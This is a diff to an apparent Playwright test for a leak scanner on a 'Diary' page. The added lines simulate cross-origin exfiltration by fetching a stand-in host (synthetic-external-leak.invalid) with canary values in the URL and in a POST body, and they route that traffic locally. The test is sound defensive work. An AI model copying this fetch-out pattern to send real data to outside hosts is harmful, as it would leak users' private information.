@@ -80,6 +80,8 @@ test('detects redacted synthetic Diary request, console and error leaks but excl
     'synthetic-diary-webstorage-canary',
     'synthetic-diary-indexeddb-canary',
     'synthetic-diary-cache-canary',
+    'synthetic-external-request-url-canary',
+    'synthetic-external-request-body-canary',
   ] as const
   try {
     await device.page.goto('/')
@@ -97,6 +99,23 @@ test('detects redacted synthetic Diary request, console and error leaks but excl
       })
     }, { body: sentinels[1], header: sentinels[5] })
     await bodyRequest
+
+    // Cross-origin exfiltration attempted by the Diary page must still be
+    // inspected. Route all probe traffic locally; nothing reaches the host.
+    await device.context.route('https://synthetic-external-leak.invalid/**', (route) =>
+      route.fulfill({ status: 204, body: '' }))
+    const externalUrlRequest = device.page.waitForEvent('request', (request) => request.url().includes(sentinels[10]))
+    await device.page.evaluate(async (needle) => {
+      await fetch(`https://synthetic-external-leak.invalid/__leak_probe?probe=${encodeURIComponent(needle)}`, { mode: 'no-cors' })
+    }, sentinels[10])
+    await externalUrlRequest
+    const externalBodyRequest = device.page.waitForEvent('request', (request) => request.postData()?.includes(sentinels[11]) === true)
+    await device.page.evaluate(async (needle) => {
+      await fetch('https://synthetic-external-leak.invalid/__leak_probe', {
+        method: 'POST', mode: 'no-cors', body: needle,
+      })
+    }, sentinels[11])
+    await externalBodyRequest
 
     const consoleEvent = device.page.waitForEvent('console', (message) => message.text().includes(sentinels[2]))
     await device.page.evaluate((needle) => console.warn(needle), sentinels[2])
@@ -149,6 +168,8 @@ test('detects redacted synthetic Diary request, console and error leaks but excl
       'sessionStorage:synthetic-security-scan-check:sentinel-7',
       'indexedDB:synthetic-security-scan-check:values:sentinel-8',
       'cache:synthetic-security-scan-check:response:sentinel-9',
+      'request-url:sentinel-10',
+      'request-body:sentinel-11',
     ]) expect(hits).toContain(required)
     expect(hits.some((hit) => hit.endsWith('sentinel-4'))).toBe(false)
     // Failure diagnostics report only location and sentinel index.
